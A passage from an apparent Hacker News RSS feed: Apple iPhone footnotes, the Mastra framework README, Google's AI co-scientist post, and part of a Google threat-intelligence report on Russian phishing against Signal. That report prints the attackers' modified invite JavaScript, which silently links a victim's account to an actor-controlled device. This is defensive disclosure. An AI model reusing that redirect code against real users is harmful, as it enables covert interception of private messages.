<li>iPhone 16e is splash-, water-, and dust-resistant. It was tested under controlled laboratory conditions and has a rating of IP68 under IEC standard 60529 (maximum depth of 6 meters for up to 30 minutes). Splash, water, and dust resistance are not permanent conditions. Resistance might decrease as a result of normal wear. Do not attempt to charge a wet iPhone; refer to the user guide for cleaning and drying instructions. Liquid damage is not covered under warranty.</li>
<li>The display has rounded corners that follow a beautiful curved design, and these corners are within a standard rectangle. When measured as a standard rectangular shape, the screen is 6.06 inches diagonally. The actual viewable area is smaller.</li>
<li>All battery claims depend on the cellular network, location, signal strength, feature configuration, usage, and many other factors; actual results will vary. The battery has limited recharge cycles and may eventually need to be replaced. Battery life and charge cycles vary by use and settings. Battery tests are conducted using specific iPhone units. See <a href="https://www.apple.com/batteries/" target="_blank">apple.com/batteries</a> and <a href="https://www.apple.com/iphone/compare/" target="_blank">apple.com/iphone/compare</a> for more information.</li>
<li>Crash Detection is designed for four-wheel passenger vehicle crashes with certain mass, G-force, and speed profiles consistent with severe, life-threatening crashes. It was designed for severe, life-threatening, high-impact front and rear, side-swipe, T-bone, and rollover crashes. Crash Detection is available worldwide on iPhone 14 or later, Apple Watch Series 8 or later, Apple Watch SE, and Apple Watch Ultra or later.</li>
<li>Some features may not be available for all countries or all areas. For more information on iOS 18, visit <a href="https://www.apple.com/ios/ios-18/" target="_blank">apple.com/ios/ios-18</a>.</li>
<li>All cobalt and lithium references use a mass balance allocation.</li>
<li>Based on retail packaging as shipped by Apple. Breakdown of U.S. retail packaging by weight. Adhesives, inks, and coatings are excluded from calculations of plastic content and packaging weight.</li>
</ol>

        </div>



    
    
    






    

















		
		
			
























		
		

</article>



</section>
</main>


	

</div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Mastra – Open-source JS agent framework, by the developers of Gatsby (294 pts)]]></title>
            <link>https://github.com/mastra-ai/mastra</link>
            <guid>43103073</guid>
            <pubDate>Wed, 19 Feb 2025 15:25:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/mastra-ai/mastra">https://github.com/mastra-ai/mastra</a>, See on <a href="https://news.ycombinator.com/item?id=43103073">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text">
<p dir="auto">Mastra is an opinionated Typescript framework that helps you build AI applications and features quickly. It gives you the set of primitives you need: workflows, agents, RAG, integrations and evals. You can run Mastra on your local machine, or deploy to a serverless cloud.</p>
<p dir="auto">The main Mastra features are:</p>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th>Features</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>LLM Models</td>
<td>Mastra uses the <a href="https://sdk.vercel.ai/docs/introduction" rel="nofollow">Vercel AI SDK</a> for model routing, providing a unified interface to interact with any LLM provider including OpenAI, Anthropic, and Google Gemini. You can choose the specific model and provider, and decide whether to stream the response.</td>
</tr>
<tr>
<td><a href="https://mastra.ai/docs/agents/00-overview" rel="nofollow">Agents</a></td>
<td>Agents are systems where the language model chooses a sequence of actions. In Mastra, agents provide LLM models with tools, workflows, and synced data. Agents can call your own functions or APIs of third-party integrations and access knowledge bases you build.</td>
</tr>
<tr>
<td><a href="https://mastra.ai/docs/agents/02-adding-tools" rel="nofollow">Tools</a></td>
<td>Tools are typed functions that can be executed by agents or workflows, with built-in integration access and parameter validation. Each tool has a schema that defines its inputs, an executor function that implements its logic, and access to configured integrations.</td>
</tr>
<tr>
<td><a href="https://mastra.ai/docs/workflows/00-overview" rel="nofollow">Workflows</a></td>
<td>Workflows are durable graph-based state machines. They have loops, branching, wait for human input, embed other workflows, do error handling, retries, parsing and so on. They can be built in code or with a visual editor. Each step in a workflow has built-in OpenTelemetry tracing.</td>
</tr>
<tr>
<td><a href="https://mastra.ai/docs/rag/overview" rel="nofollow">RAG</a></td>
<td>Retrieval-augemented generation (RAG) lets you construct a knowledge base for agents. RAG is an ETL pipeline with specific querying techniques, including chunking, embedding, and vector search.</td>
</tr>
<tr>
<td><a href="https://mastra.ai/docs/local-dev/integrations" rel="nofollow">Integrations</a></td>
<td>In Mastra, integrations are auto-generated, type-safe API clients for third-party services that can be used as tools for agents or steps in workflows.</td>
</tr>
<tr>
<td><a href="https://mastra.ai/docs/08-running-evals" rel="nofollow">Evals</a></td>
<td>Evals are automated tests that evaluate LLM outputs using model-graded, rule-based, and statistical methods. Each eval returns a normalized score between 0-1 that can be logged and compared. Evals can be customized with your own prompts and scoring functions.</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<p dir="auto"><h2 tabindex="-1" dir="auto">Quick Start</h2><a id="user-content-quick-start" aria-label="Permalink: Quick Start" href="#quick-start"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Prerequisites</h3><a id="user-content-prerequisites" aria-label="Permalink: Prerequisites" href="#prerequisites"></a></p>
<ul dir="auto">
<li>Node.js (v20.0+)</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Get an LLM provider API key</h2><a id="user-content-get-an-llm-provider-api-key" aria-label="Permalink: Get an LLM provider API key" href="#get-an-llm-provider-api-key"></a></p>
<p dir="auto">If you don't have an API key for an LLM provider, you can get one from the following services:</p>
<ul dir="auto">
<li><a href="https://platform.openai.com/" rel="nofollow">OpenAI</a></li>
<li><a href="https://console.anthropic.com/settings/keys" rel="nofollow">Anthropic</a></li>
<li><a href="https://ai.google.dev/gemini-api/docs" rel="nofollow">Google Gemini</a></li>
</ul>
<p dir="auto">If you don't have an account with these providers, you can sign up and get an API key. Anthropic require a credit card to get an API key. Some OpenAI models and Gemini do not and have a generous free tier for its API.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Create a new project</h2><a id="user-content-create-a-new-project" aria-label="Permalink: Create a new project" href="#create-a-new-project"></a></p>
<p dir="auto">The easiest way to get started with Mastra is by using <code>create-mastra</code>. This CLI tool enables you to quickly start building a new Mastra application, with everything set up for you.</p>

<p dir="auto"><h3 tabindex="-1" dir="auto">Run the script</h3><a id="user-content-run-the-script" aria-label="Permalink: Run the script" href="#run-the-script"></a></p>
<p dir="auto">Finally, run <code>mastra dev</code> to open the Mastra playground.</p>

<p dir="auto">If you're using Anthropic, set the <code>ANTHROPIC_API_KEY</code>. If you're using Gemini, set the <code>GOOGLE_GENERATIVE_AI_API_KEY</code>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Contributing</h2><a id="user-content-contributing" aria-label="Permalink: Contributing" href="#contributing"></a></p>
<p dir="auto">Looking to contribute? All types of help are appreciated, from coding to testing and feature specification.</p>
<p dir="auto">If you are a developer and would like to contribute with code, please open an issue to discuss before opening a Pull Request.</p>
<p dir="auto">Information about the project setup can be found in the <a href="https://github.com/mastra-ai/mastra/blob/main/DEVELOPMENT.md">development documentation</a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Support</h2><a id="user-content-support" aria-label="Permalink: Support" href="#support"></a></p>
<p dir="auto">We have an <a href="https://discord.gg/BTYqqHKUrf" rel="nofollow">open community Discord</a>. Come and say hello and let us know if you have any questions or need any help getting things running.</p>
<p dir="auto">It's also super helpful if you leave the project a star here at the <a href="https://github.com/mastra-ai/mastra">top of the page</a></p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Accelerating scientific breakthroughs with an AI co-scientist (259 pts)]]></title>
            <link>https://research.google/blog/accelerating-scientific-breakthroughs-with-an-ai-co-scientist/</link>
            <guid>43102528</guid>
            <pubDate>Wed, 19 Feb 2025 14:32:54 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://research.google/blog/accelerating-scientific-breakthroughs-with-an-ai-co-scientist/">https://research.google/blog/accelerating-scientific-breakthroughs-with-an-ai-co-scientist/</a>, See on <a href="https://news.ycombinator.com/item?id=43102528">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-gt-publish-date="20250219">
                    
                    
    


<div data-gt-id="rich_text" data-gt-component-name="">
    




    <p data-block-key="685z4">In the pursuit of scientific advances, researchers combine ingenuity and creativity with insight and expertise grounded in literature to generate novel and viable research directions and to guide the exploration that follows. In many fields, this presents a breadth and depth conundrum, since it is challenging to navigate the rapid growth in the rate of scientific publications while integrating insights from unfamiliar domains. Yet overcoming such challenges is critical, as evidenced by the many modern breakthroughs that have emerged from transdisciplinary endeavors. For example, Emmanuelle Charpentier and Jennifer Doudna won the <a href="https://www.nobelprize.org/uploads/2020/10/popular-chemistryprize2020.pdf" target="_blank" rel="noopener noreferrer">2020 Nobel Prize in Chemistry</a> for their work on <a href="https://en.wikipedia.org/wiki/CRISPR" target="_blank" rel="noopener noreferrer">CRISPR</a>, which combined expertise ranging from microbiology to genetics to molecular biology.</p><p data-block-key="bngi7">Motivated by unmet needs in the modern scientific discovery process and building on <a href="https://arxiv.org/abs/2403.05530" target="_blank" rel="noopener noreferrer">recent AI advances</a>, including the ability to synthesize across complex subjects and to perform <a href="https://deepmind.google/technologies/gemini/flash-thinking/" target="_blank" rel="noopener noreferrer">long-term planning and reasoning</a>, we developed an <a href="https://storage.googleapis.com/coscientist_paper/ai_coscientist.pdf" target="_blank" rel="noopener noreferrer">AI co-scientist system</a>. The AI co-scientist is a multi-agent AI system that is intended to function as a collaborative tool for scientists. Built on <a href="https://blog.google/technology/google-deepmind/google-gemini-ai-update-december-2024/" target="_blank" rel="noopener noreferrer">Gemini 2.0, AI co-scientist is</a> designed to mirror the reasoning process underpinning the scientific method. Beyond standard literature review, summarization and “deep research” tools, the AI co-scientist system is intended to uncover new, original knowledge and to formulate demonstrably novel research hypotheses and proposals, building upon prior evidence and tailored to specific research objectives.</p>
</div>

                    
                    
    


<div data-gt-id="rich_text" data-gt-component-name="">
    


    <p>
        
            
                <h2>Empowering scientists and accelerating discoveries with the AI co-scientist</h2>
            
        
        
    </p>



    <p data-block-key="685z4">Given a scientist’s research goal that has been specified in natural language, the AI co-scientist is designed to generate novel research hypotheses, a detailed research overview, and experimental protocols. To do so, it uses a coalition of specialized agents — <i>Generation</i>, <i>Reflection</i>, <i>Ranking</i>, <i>Evolution</i>, <i>Proximity</i> and <i>Meta-review</i> — that are inspired by the scientific method itself. These agents use automated feedback to iteratively generate, evaluate, and refine hypotheses, resulting in a self-improving cycle of increasingly high-quality and novel outputs.</p>
</div>

                    
                    
    




                    
                    
    


<div>
        
  <p data-block-key="j3yy8">Purpose-built for collaboration, scientists can interact with the system in many ways, including by directly providing their own seed ideas for exploration or by providing feedback on generated outputs in natural language. The AI co-scientist also uses tools, like web-search and specialized AI models, to enhance the grounding and quality of generated hypotheses.</p>

    </div>

                    
                    
    




                    
                    
    


<div>
        
  <p data-block-key="685z4">The AI co-scientist parses the assigned goal into a research plan configuration, managed by a Supervisor agent. The Supervisor agent assigns the specialized agents to the worker queue and allocates resources. This design enables the system to flexibly scale compute and to iteratively improve its scientific reasoning towards the specified research goal.</p>

    </div>

                    
                    
    




                    
                    
    


<div data-gt-id="rich_text" data-gt-component-name="">
    


    <p>
        
            
                <h2>Scaling test-time compute for advanced scientific reasoning</h2>
            
        
        
    </p>



    <p data-block-key="685z4">The AI co-scientist leverages <a href="https://arxiv.org/abs/2408.03314" target="_blank" rel="noopener noreferrer">test-time compute</a> scaling to iteratively reason, evolve, and improve outputs. Key reasoning steps include <a href="https://deepmind.google/discover/blog/alphago-zero-starting-from-scratch/" target="_blank" rel="noopener noreferrer">self-play</a>–based scientific debate for novel hypothesis generation, ranking tournaments for hypothesis comparison, and an "evolution" process for quality improvement. The system's agentic nature facilitates recursive self-critique, including tool use for feedback to refine hypotheses and proposals.</p><p data-block-key="7ufde">The system's self-improvement relies on the <a href="https://en.wikipedia.org/wiki/Elo_rating_system" target="_blank" rel="noopener noreferrer">Elo</a> auto-evaluation metric derived from its tournaments. Due to their core role, we assessed whether higher Elo ratings correlate with higher output quality. We analyzed the concordance between Elo auto-ratings and <a href="https://arxiv.org/abs/2311.12022" target="_blank" rel="noopener noreferrer">GPQA benchmark</a> accuracy on its diamond set of challenging questions, and we found that higher Elo ratings positively correlate with a higher probability of correct answers.</p>
</div>

                    
                    
    




                    
                    
    


<div>
        
  <p data-block-key="685z4">Seven domain experts curated 15 open research goals and best guess solutions in their field of expertise. Using the automated Elo metric we observed that the AI co-scientist outperformed other state-of-the-art agentic and reasoning models for these complex problems. The analysis reproduced the benefits of scaling test-time compute using inductive biases derived from the scientific method. As the system spends more time reasoning and improving, the self-rated quality of results improve and surpass models and unassisted human experts.</p>

    </div>

                    
                    
    




                    
                    
    




                    
                    
    


<div>
        
  <p data-block-key="685z4">On a smaller subset of 11 research goals, experts assessed the novelty and impact of the AI co-scientist–generated results compared to other relevant baselines; they also provided overall preference. While the sample size was small, experts assessed the AI co-scientist to have higher potential for novelty and impact, and preferred its outputs compared to other models. Further, these human expert preferences also appeared to be concordant with the previously introduced Elo auto-evaluation metric.</p>

    </div>

                    
                    
    




                    
                    
    




                    
                    
    


<div data-gt-id="rich_text" data-gt-component-name="">
    


    <p>
        
            
                <h2>Validation of novel AI co-scientist hypotheses with real-world laboratory experiments</h2>
            
        
        
    </p>



    <p data-block-key="685z4">To assess the practical utility of the system’s novel predictions, we evaluated end-to-end laboratory experiments probing the AI co-scientist–generated hypotheses and research proposals in three key biomedical applications: drug repurposing, proposing novel treatment targets, and elucidating the mechanisms underlying antimicrobial resistance. These settings all involved expert-in-the-loop guidance and spanned an array of complexities:</p>
</div>

                    
                    
    




                    
                    
    


<div data-gt-id="rich_text" data-gt-component-name="">
    


    <p>
        
            
                <h3>Drug repurposing for acute myeloid leukaemia</h3>
            
        
        
    </p>



    <p data-block-key="685z4">Drug development is an <a href="https://en.wikipedia.org/wiki/Eroom%27s_law" target="_blank" rel="noopener noreferrer">increasingly time-consuming and expensive process</a> in which new therapeutics require many aspects of the discovery and development process to be restarted for each indication or disease. Drug repurposing addresses this challenge by discovering new therapeutic applications for existing drugs beyond their original intended use. But, due to the complexity of the task, it demands extensive interdisciplinary expertise.</p><p data-block-key="d494o">We applied the AI co-scientist to assist with the prediction of drug repurposing opportunities and, with our partners, validated predictions through computational biology, expert clinician feedback, and <i>in vitro</i> experiments.</p><p data-block-key="18gc5">Notably, the AI co-scientist proposed novel repurposing candidates for <a href="https://en.wikipedia.org/wiki/Acute_myeloid_leukemia" target="_blank" rel="noopener noreferrer">acute myeloid leukemia</a> (AML). Subsequent experiments validated these proposals, confirming that the suggested drugs inhibit tumor viability at clinically relevant concentrations in multiple AML cell lines.</p>
</div>

                    
                    
    




                    
                    
    


<div data-gt-id="rich_text" data-gt-component-name="">
    


    <p>
        
            
                <h3>Advancing target discovery for liver fibrosis</h3>
            
        
        
    </p>



    <p data-block-key="685z4">Identifying novel treatment targets is more complex than drug repurposing, and often leads to inefficient hypothesis selection and poor prioritization for <i>in vitro</i> and <i>in vivo</i> experiments. AI-assisted target discovery helps to streamline the process of experimental validation, potentially helping to reduce development time costs.</p><p data-block-key="8k4au">We probed the AI co-scientist system's ability to propose, rank, and generate hypotheses and experimental protocols for target discovery hypotheses, focusing on <a href="https://pmc.ncbi.nlm.nih.gov/articles/PMC546435/" target="_blank" rel="noopener noreferrer">liver fibrosis</a>. The AI co-scientist demonstrated its potential by identifying epigenetic targets grounded in preclinical evidence with significant anti-fibrotic activity in <a href="https://pubmed.ncbi.nlm.nih.gov/28878125/" target="_blank" rel="noopener noreferrer">human hepatic organoids</a> (3D, multicellular tissue cultures derived from human cells and designed to mimic the structure and function of the human liver). These findings will be detailed in an upcoming report led by collaborators at Stanford University.</p>
</div>

                    
                    
    




                    
                    
    


<div data-gt-id="rich_text" data-gt-component-name="">
    


    <p>
        
            
                <h3>Explaining mechanisms of antimicrobial resistance</h3>
            
        
        
    </p>



    <p data-block-key="685z4">As a third validation, we focused on generating hypotheses to explain bacterial gene transfer evolution mechanisms related to antimicrobial resistance (AMR) — microbes' evolved mechanisms to resist infection-treating drugs. This is another complex challenge that involves understanding the molecular mechanisms of gene transfer (<a href="https://www.nature.com/scitable/definition/conjugation-prokaryotes-290/#:~:text=Conjugation%20is%20the%20process%20by,factor%2C%20or%20F%2Dfactor." target="_blank" rel="noopener noreferrer">conjugation</a>, <a href="https://en.wikipedia.org/wiki/Transduction_(genetics)" target="_blank" rel="noopener noreferrer">transduction</a>, and <a href="https://en.wikipedia.org/wiki/Genetic_transformation" target="_blank" rel="noopener noreferrer">transformation</a>) alongside the ecological and evolutionary pressures that drive AMR genes to spread.</p><p data-block-key="9a67g">For this test, expert researchers instructed the AI co-scientist to explore a topic that had already been subject to novel discovery in their group, but had not yet been revealed in the public domain, namely, to explain how <a href="https://pubmed.ncbi.nlm.nih.gov/36596306/" target="_blank" rel="noopener noreferrer">capsid-forming phage-inducible chromosomal islands</a> (cf-PICIs) exist across multiple bacterial species. The AI co-scientist system independently proposed that cf-PICIs interact with diverse phage tails to expand their host range. This<i> in silico</i> discovery, which had been experimentally validated in the original novel laboratory experiments performed prior to use of the AI co-scientist system, are described in co-timed manuscripts (<a href="https://www.biorxiv.org/content/10.1101/2025.02.11.637232v1" target="_blank" rel="noopener noreferrer">1</a>, <a href="https://storage.googleapis.com/coscientist_paper/penades2025ai.pdf" target="_blank" rel="noopener noreferrer">2</a>) with our collaborators at the Fleming Initiative and Imperial College London. This illustrates the value of the AI co-scientist system as an assistive technology, as it was able to leverage decades of research comprising all prior open access literature on this topic.</p>
</div>

                    
                    
    




                    
                    
    


<div data-gt-id="rich_text" data-gt-component-name="">
    


    <p>
        
            
                <h2>Limitations and outlook</h2>
            
        
        
    </p>



    <p data-block-key="685z4">In our report we address several limitations of the system and opportunities for improvement, including enhanced literature reviews, factuality checking, cross-checks with external tools, auto-evaluation techniques, and larger-scale evaluation involving more subject matter experts with varied research goals. The AI co-scientist represents a promising advance toward AI-assisted technologies for scientists to help accelerate discovery. Its ability to generate novel, testable hypotheses across diverse scientific and biomedical domains — some already validated experimentally — and its capacity for recursive self-improvement with increased compute, demonstrate its potential to accelerate scientists' efforts to address grand challenges in science and medicine. We look forward to responsible exploration of the potential of the AI co-scientist as an assistive tool for scientists. This project illustrates how collaborative and human-centred AI systems might be able to augment human ingenuity and accelerate scientific discovery.</p>
</div>

                    
                    
    


<div data-gt-id="rich_text" data-gt-component-name="">
    


    <p>
        
            
                <h2>Announcing Trusted Tester access to the AI co-scientist system</h2>
            
        
        
    </p>



    <p data-block-key="685z4">We are excited by the early promise of the AI co-scientist system and believe it is important to evaluate its strengths and limitations in science and biomedicine more broadly. To facilitate this responsibly we will be enabling access to the system for research organizations through a Trusted Tester Program. We encourage interested research organizations around the world to consider joining this program <a href="https://docs.google.com/forms/d/e/1FAIpQLSdvw_8IPrc8O7ZM8FKF46i8BnOYMeSeyLeBNiuk_yGWIlnxYA/viewform" target="_blank" rel="noopener noreferrer">here</a>.</p>
</div>

                    
                    
    


<div data-gt-id="rich_text" data-gt-component-name="">
    


    <p>
        
            
                <h2>Acknowledgements</h2>
            
        
        
    </p>



    <p data-block-key="685z4"><i>The research described here is a joint effort between many Google Research, Google Deepmind and Google Cloud AI teams. We thank our co-authors at Fleming Initiative and Imperial College London, Houston Methodist Hospital, Sequome, and Stanford University — José R Penadés, Tiago R D Costa, Vikram Dhillon, Eeshit Dhaval Vaishnav, Byron Lee, Jacob Blum and Gary Peltz. We appreciate Subhashini Venugopalan and Yun Liu for their detailed feedback on the manuscripts described here. We are also grateful to the many incredible scientists across institutions providing detailed technical and expert feedback — please refer to our report to see the voices and minds that aided this work. We also thank our teammates Resham Parikh, Taylor Goddu, Siyi Kou, Rachelle Sico, Amanda Ferber, Cat Kozlowski, Alison Lentz, KK Walker, Roma Ruparel, Jenn Sturgeon, Lauren Winer, Juanita Bawagan, Tori Milner, MK Blake, Kalyan Pamarthy for their support</i>.<i> Finally, we also thank John Platt, Michael Brenner, Zoubin Ghahramani, Dale Webster, Joelle Barral, Michael Howell, Susan Thomas, Jason Freidenfelds, Karen DeSalvo, Vladimir Vuskovic, Greg Corrado, Ronit Levavi Morad, Ali Eslami, Anna Koivuniemi, Royal Hansen, Andy Berndt, Noam Shazeer, Oriol Vinyals, Burak Gokturk, Amin Vahdat, Katherine Chou, Avinatan Hassidim, Koray Kavukcuoglu, Pushmeet Kohli, Yossi Matias, James Manyika, Jeff Dean and Demis Hassabis for their support.</i></p>
</div>

                    
                </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Multiple Russia-aligned threat actors actively targeting Signal Messenger (589 pts)]]></title>
            <link>https://cloud.google.com/blog/topics/threat-intelligence/russia-targeting-signal-messenger</link>
            <guid>43102284</guid>
            <pubDate>Wed, 19 Feb 2025 14:05:23 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://cloud.google.com/blog/topics/threat-intelligence/russia-targeting-signal-messenger">https://cloud.google.com/blog/topics/threat-intelligence/russia-targeting-signal-messenger</a>, See on <a href="https://news.ycombinator.com/item?id=43102284">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><h5>Google Threat Intelligence Group </h5></div><div jsname="tx2NYc"><section><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><p>Written by: Dan Black</p>
<hr></span></section><section><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><p><span>Google Threat Intelligence Group (GTIG) has observed increasing efforts from several Russia state-aligned threat actors to compromise Signal Messenger accounts used by individuals of interest to Russia's intelligence services. While this emerging operational interest has likely been sparked by wartime demands to gain access to sensitive government and military communications in the context of Russia's re-invasion of Ukraine, we anticipate the tactics and methods used to target Signal will grow in prevalence in the near-term and proliferate to additional threat actors and regions outside the Ukrainian theater of war.</span></p>
<p><span>Signal's popularity among common targets of surveillance and espionage activity—such as military personnel, politicians, journalists, activists, and other at-risk communities—has positioned the secure messaging application as a high-value target for adversaries seeking to intercept sensitive information that could fulfil a range of different intelligence requirements. More broadly, this threat also extends to other popular messaging applications such as WhatsApp and Telegram, which are also being actively targeted by Russian-aligned threat groups using similar techniques. In anticipation of a wider adoption of similar tradecraft by other threat actors, we are issuing a public warning regarding the tactics and methods used to date to help build public awareness and help communities better safeguard themselves from similar threats.</span></p>
<p><span><span>We are grateful to the team at Signal for their close partnership in investigating this activity. The latest Signal releases on </span><a href="https://github.com/signalapp/Signal-Android/commit/112874c08019a40b6f8f1dbbf84eb0ab4d796582" rel="noopener" target="_blank"><span>Android</span></a><span> and </span><a href="https://github.com/signalapp/Signal-iOS/commit/498b97033254c514404345efc1d4c29c1b076f6c" rel="noopener" target="_blank"><span>iOS</span></a><span> contain hardened features designed to help protect against similar phishing campaigns in the future. </span><a href="https://support.signal.org/hc/en-us/articles/360007059212-How-do-I-ensure-Signal-is-up-to-date" rel="noopener" target="_blank"><span>Update</span></a><span> to the latest version to enable these features.</span></span></p></span></section><section><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><h2><span>Phishing Campaigns Abusing Signal's "Linked Devices" Feature</span></h2>
<p><span>The most novel and widely used technique underpinning Russian-aligned attempts to compromise Signal accounts is the abuse of the app's legitimate "</span><a href="https://support.signal.org/hc/en-us/articles/360007320551-Linked-Devices" rel="noopener" target="_blank"><span>linked devices</span></a><span>" feature that enables Signal to be used on multiple devices concurrently. Because linking an additional device typically requires scanning a quick-response (QR) code, threat actors have resorted to crafting malicious QR codes that, when scanned, will link a victim's account to an actor-controlled Signal instance. If successful, future messages will be delivered synchronously to both the victim and the threat actor in real-time, providing a persistent means to eavesdrop on the victim's secure conversations without the need for full-device compromise.</span></p>
<ul>
<li>
<p><span>In remote phishing operations observed to date, malicious QR codes have frequently been masked as legitimate Signal resources, such as group invites, security alerts, or as legitimate device pairing instructions from the Signal website.</span></p>
</li>
<li>
<p><span>In more tailored remote phishing operations, malicious device-linking QR codes have been embedded in phishing pages crafted to appear as specialized applications used by the Ukrainian military.</span></p>
</li>
<li>
<p><span>Beyond remote phishing and malware delivery operations, we have also seen malicious QR codes being used in close-access operations. </span><a href="https://cloud.google.com/blog/topics/threat-intelligence/apt44-unearthing-sandworm"><span>APT44</span></a><span> (aka Sandworm or Seashell Blizzard, a threat actor attributed by </span><a href="https://www.justice.gov/opa/pr/six-russian-gru-officers-charged-connection-worldwide-deployment-destructive-malware-and" rel="noopener" target="_blank"><span>multiple</span></a><span> governments to the Main Centre for Special Technologies (GTsST) within Main Directorate of the General Staff of the Armed Forces of the Russian Federation (GU), known commonly as the GRU) has worked to enable forward-deployed Russian military forces to link Signal accounts on devices captured on the battlefield back to actor-controlled infrastructure for follow-on exploitation.</span></p>
</li>
</ul>
<p><span>Notably, this device-linking concept of operations has proven to be a low-signature form of initial access due to the lack of centralized, technology-driven detections and defenses that can be used to monitor for account compromise via newly linked devices; when successful, there is a high risk that a compromise can go unnoticed for extended periods of time.</span></p>
<h2><span>UNC5792: Modified Signal Group Invites</span></h2>
<p><span>To compromise Signal accounts using the device-linking feature, one suspected Russian espionage cluster tracked as UNC5792 (which partially overlaps with CERT-UA's </span><a href="https://cert.gov.ua/article/6278735" rel="noopener" target="_blank"><span>UAC-0195</span></a><span>) has altered legitimate "</span><a href="https://support.signal.org/hc/en-us/articles/360051086971-Group-Link-or-QR-code" rel="noopener" target="_blank"><span>group invite</span></a><span>" pages for delivery in phishing campaigns, replacing the expected redirection to a Signal group with a redirection to a malicious URL crafted to link an actor-controlled device to the victim's Signal account.</span></p>
<ul>
<li>
<p><span>In these operations, UNC5792 has hosted modified Signal group invitations on actor-controlled infrastructure designed to appear identical to a legitimate Signal group invite.</span></p>
</li>
<li>
<p><span>In each of the fake group invites, JavaScript code that typically redirects the user to join a Signal group has been replaced by a malicious block containing the Uniform Resource Identifier (URI) used by Signal to link a new device to Signal (i.e., "sgnl://linkdevice?uuid="), tricking victims into linking their Signal accounts to a device controlled by UNC5792.</span></p>
</li>
</ul></span></section><section><figure><section jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img src="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig1-signal.max-1600x1600.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig1-signal.max-1600x1600.png" jsname="P3Vluc" jsaction="click:HTIlC" loading="lazy"></section></figure><p><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><p>Figure 1: Example modified Signal group invite hosted on UNC5792-controlled domain "signal-groups[.]tech"</p></span></p></section><section><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><pre><code>function doRedirect() {
if (window.location.hash) {
var redirect = "sgnl://signal.group/" + window.location.hash
document.getElementById('go-to-group').href = redirect
window.location = redirect
} else {
document.getElementById('join-button').innerHTML = "No group found."
window.onload = doRedirect</code></pre>
<p><span>Figure 2: Typical legitimate group invite code for redirection to a Signal group</span></p></span></section><section><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><pre><code>function doRedirect() {
var redirect = 'sgnl://linkdevice
uuid=h_8WKmzwam_jtUeoD_NQyg%3D%3D
pub_key=Ba0212mHrGIy4t%2FzCCkKkRKwiS0osyeLF4j1v8DKn%2Fg%2B'
//redirect=encodeURIComponent(redirect)
document.getElementById('go-to-group').href = redirect
window.location = redirect
window.onload = doRedirect</code></pre>
<p><span><span>Figure 3: Example of UNC5792 modified redirect code used to link the victim's device to an actor-controlled Signal instance</span></span></p></span></section><section><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><h2><span>UNC4221: Custom-Developed Signal Phishing Kit</span></h2>
<p><span>UNC4221 (tracked by CERT-UA as </span><a href="https://cert.gov.ua/article/6281632" rel="noopener" target="_blank"><span>UAC-0185</span></a><span>) is an additional Russia-linked threat actor who has actively targeted Signal accounts used by Ukrainian military personnel. The group operates a tailored Signal phishing kit designed to mimic components of the </span><a href="https://united24media.com/war-in-ukraine/ukraines-secret-weapon-kropyva-software-4026#:~:text=Kropyva's%20impact&amp;text=Amongst%20the%20Ukrainian%20Armed%20Forces,applications%20across%20Ukraine's%20armed%20forces." rel="noopener" target="_blank"><span>Kropyva</span></a><span> application used by the Armed Forces of Ukraine for artillery guidance. Similar to the social engineering approach used by UNC5792, UNC4221 has also attempted to mask its device-linking functionality as an invite to a Signal group from a trusted contact. Different variations of this phishing kit have been observed, including:</span></p>
<ul>
<li>
<p><span>Phishing websites that redirect victims to secondary phishing infrastructure masquerading as legitimate device-linking instructions provisioned by Signal (Figure 4)</span></p>
</li>
<li>
<p><span>Phishing websites with the malicious device-linking QR code directly embedded into the primary Kropyva-themed phishing kit (Figure 5)</span></p>
</li>
<li>
<p><span>In earlier operations in 2022, UNC4221 phishing pages were crafted to appear as a legitimate security alert from Signal (Figure 6)</span></p>
</li>
